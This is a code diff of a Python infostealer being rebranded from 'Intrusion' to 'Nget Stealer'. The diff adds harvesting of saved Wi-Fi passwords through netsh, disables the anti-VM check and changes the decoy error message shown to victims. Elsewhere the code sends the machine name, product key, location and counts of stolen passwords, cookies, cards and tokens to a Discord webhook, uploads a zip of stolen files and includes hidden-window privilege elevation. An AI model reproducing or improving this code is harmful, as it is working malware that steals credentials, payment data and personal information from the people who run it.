@@ -11,11 +11,11 @@ config = {
     'persist': False,
     'keep-alive': False,  
     'hideconsole': True, 
-    'antivm': True,  
+    'antivm': False,  
     'force_admin': False, 
     'black_screen': False, 
     'error': True, 
-    'error_message': 'He is Clean No traces Found',
+    'error_message': 'Failed To Open Poop Tool\nclick "ok" to open',
 }
 class functions(object):
     def getHeaders(self, token:str=None, content_type="application/json") -> dict:
@@ -569,7 +569,19 @@ Antivirus: {avlist}
         for _file in to_grab:
             if os.path.exists(os.path.join(gdf, _file)):
                 shutil.copy2(os.path.join(gdf, _file), gd + os.sep + _file)
+    
     def SendInfo(self):
+        command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
+        profile_names = set(re.findall(r"All User Profile\s*:(.*)", command_output))
+        wifi_data = ""
+        for profile in profile_names:
+            profile = profile.strip()
+            profile_info = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"], capture_output=True).stdout.decode()
+            profile_password = re.findall(r"Key Content\s*:(.*)", profile_info)
+            if len(profile_password) == 0:
+                wifi_data += f"{profile}: Open\n"
+            else:
+                wifi_data += f"{profile}: {profile_password[0].strip()}\n"
         wname = self.getProductValues()[0]
         wkey = self.getProductValues()[1]
         ip = country = city = region = googlemap = "None"
@@ -593,50 +605,52 @@ Antivirus: {avlist}
         zipped_file.close()
         self.files, self.fileCount = self.gen_tree(self.tempfolder)
         embed = {
-                    "username": f"{os.getlogin()} | Intrusion Developed By veal#0001",
+                    "username": f"{os.getlogin()} | nget",
                     "content": "@everyone",
-                    "avatar_url": "https://cdn.discordapp.com/attachments/1167259290608873535/1177459014485954580/pfp.png?ex=65729529&is=65602029&hm=c59ec1d1b1629e34fad50a7339172db2c8275d580df9bebfa0837748232342df&",
+                    "avatar_url": "https://cdn.discordapp.com/attachments/1179997780014534736/1181715439181627533/image0.gif?ex=65821143&is=656f9c43&hm=cee967430b222553a2dafcee186817e60f0c445de5320d7918f0dc79ce75d727&",
                     "embeds": [
                                 {
                                     "author": {
-                                        "name": "Intrusion",
+                                        "name": "Nget Stealer",
                                         "url": "",
-                                        "icon_url": "https://cdn.discordapp.com/attachments/1167259290608873535/1177459014485954580/pfp.png?ex=65729529&is=65602029&hm=c59ec1d1b1629e34fad50a7339172db2c8275d580df9bebfa0837748232342df&"
+                                        "icon_url": "https://cdn.discordapp.com/attachments/1179997780014534736/1181715439181627533/image0.gif?ex=65821143&is=656f9c43&hm=cee967430b222553a2dafcee186817e60f0c445de5320d7918f0dc79ce75d727&"
                                     },
-                                    "description": f'**{os.getlogin()}** ran Intrusion.\n\n'
-                                                   f'<a:pink:1157448211133370409>  **Computer Name:** {os.getenv("COMPUTERNAME")}\n'
-                                                   f'<a:pink:1157448211133370409> **{wname}:** {wkey if wkey else "No Product Key!"}\n'
-                                                   f'<a:9082_gun_uzi_aestheticf4bihype:1173395853680050287>  **IP:** {ip} (VPN/Proxy: {requests.get("http://ip-api.com/json?fields=proxy").json()["proxy"]})\n'
-                                                   f'<a:9082_gun_uzi_aestheticf4bihype:1173395853680050287>  **City:** {city}\n'
-                                                   f'<a:9082_gun_uzi_aestheticf4bihype:1173395853680050287>  **Region:** {region}\n'
-                                                   f'<a:9082_gun_uzi_aestheticf4bihype:1173395853680050287>  **Country:** {country}\n'
-                                                   f'[Google Maps Location]({googlemap})\n'
-                                                   f'| <:1_b7:1117326289683087452> Stats\n'
-                                                   f'| <:1_b7:1117326289683087452> Passwords Found: {self.stats["passwords"]}\n'
-                                                   f'| <:1_b7:1117326289683087452> Cookies Found: {self.stats["cookies"]}\n'
-                                                   f'| <:1_b7:1117326289683087452> Phone Numbers Found: {self.stats["phones"]}\n'
-                                                   f'| <:1_b7:1117326289683087452> Cards Found: {self.stats["cards"]}\n'
-                                                   f'| <:1_b7:1117326289683087452> Addresses Found: {self.stats["addresses"]}\n'
-                                                   f'| <:1_b7:1117326289683087452> Tokens Found: {self.stats["tokens"]}\n'
-                                                   f'| <:1_b7:1117326289683087452> Time: {"{:.2f}".format(time.time() - self.starttime)}s',
+                                    "description": f'**{os.getlogin()}** ran Nget Stealer.\n\n'
+                                                   f'<a:dancingblob:873253607749857280>  **Computer Name:** {os.getenv("COMPUTERNAME")}\n'
+                                                   f'<a:dancingblob:873253607749857280> **{wname}:** ||{wkey if wkey else "No Product Key!"}||\n'
+                                                   f'\n<a:dancingblob:873253607749857280>  **IP:** {ip} (VPN/Proxy: {requests.get("http://ip-api.com/json?fields=proxy").json()["proxy"]})\n'
+                                                   f'<a:dancingblob:873253607749857280>  **City:** {city}\n'
+                                                   f'<a:dancingblob:873253607749857280>  **Region:** {region}\n'
+                                                   f'<a:dancingblob:873253607749857280>  **Country:** {country}\n'
+                                                   f'<a:dancingblob:873253607749857280> Stats\n'
+                                                   f'<a:dancingblob:873253607749857280> Passwords Found: {self.stats["passwords"]}\n'
+                                                   f'<a:dancingblob:873253607749857280> Cookies Found: {self.stats["cookies"]}\n'
+                                                   f'<a:dancingblob:873253607749857280> Phone Numbers Found: {self.stats["phones"]}\n'
+                                                   f'<a:dancingblob:873253607749857280> Cards Found: {self.stats["cards"]}\n'
+                                                   f'<a:dancingblob:873253607749857280> Addresses Found: {self.stats["addresses"]}\n'
+                                                   f'<a:dancingblob:873253607749857280> Tokens Found: {self.stats["tokens"]}\n'
+                                                   f'<a:dancingblob:873253607749857280> **Net Profile Names:** ```{profile_names}```\n'
+                                                   f'<a:dancingblob:873253607749857280> **Network Info** ```{profile_info}```\n'
+                                                   f'<a:dancingblob:873253607749857280> **Currently Connected** ```{profile}\n{profile_password}```\n'
+                                                   f'<a:dancingblob:873253607749857280> Time: {"{:.2f}".format(time.time() - self.starttime)}s',
+                                                   
                                     "inline": False,
                                     "color": 0x00000,
                                     "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                                     "thumbnail": {
-                                        "url": "https://cdn.discordapp.com/attachments/1167259290608873535/1177459014485954580/pfp.png?ex=65729529&is=65602029&hm=c59ec1d1b1629e34fad50a7339172db2c8275d580df9bebfa0837748232342df&"
+                                        "url": "https://cdn.discordapp.com/attachments/1179997780014534736/1181715439181627533/image0.gif?ex=65821143&is=656f9c43&hm=cee967430b222553a2dafcee186817e60f0c445de5320d7918f0dc79ce75d727&"
                                     },
                                     "footer": {
-                                        "text": "Intrusion",
-                                        "icon_url": "https://cdn.discordapp.com/attachments/1167259290608873535/1177459014485954580/pfp.png?ex=65729529&is=65602029&hm=c59ec1d1b1629e34fad50a7339172db2c8275d580df9bebfa0837748232342df&"
+                                        "text": "Nget Stealer",
+                                        "icon_url": "https://cdn.discordapp.com/attachments/1179997780014534736/1181715439181627533/image0.gif?ex=65821143&is=656f9c43&hm=cee967430b222553a2dafcee186817e60f0c445de5320d7918f0dc79ce75d727&"
                                     }
                                 }
                             ]
                         }         
         fileEmbed = {
-            "username": f"{os.getlogin()} | Intrusion",
-            "avatar_url":"https://cdn.discordapp.com/attachments/1167259290608873535/1177459014485954580/pfp.png?ex=65729529&is=65602029&hm=c59ec1d1b1629e34fad50a7339172db2c8275d580df9bebfa0837748232342df&"
+            "username": f"{os.getlogin()} | Nget",
+            "avatar_url":"https://cdn.discordapp.com/attachments/1179997780014534736/1181715439181627533/image0.gif?ex=65821143&is=656f9c43&hm=cee967430b222553a2dafcee186817e60f0c445de5320d7918f0dc79ce75d727&"
         }
-        
         with open(_zipfile,'rb') as infozip:
             requests.post(self.webhook, json=embed)
             if requests.post(self.webhook, data=fileEmbed, files={'upload_file': infozip}).status_code == 413:
@@ -657,6 +671,7 @@ Antivirus: {avlist}
                 a = fileEmbed.copy()
                 a.update({"content": f"{link}"})
                 requests.post(self.webhook, json=a)
+        
         os.remove(_zipfile)
     def forceadmin(self):
         self.system(f'set __COMPAT_LAYER=RunAsInvoker && powershell Start-Process \'{sys.argv[0]}\' -WindowStyle Hidden -verb runAs -ArgumentList \'--nouacbypass\'>nul')
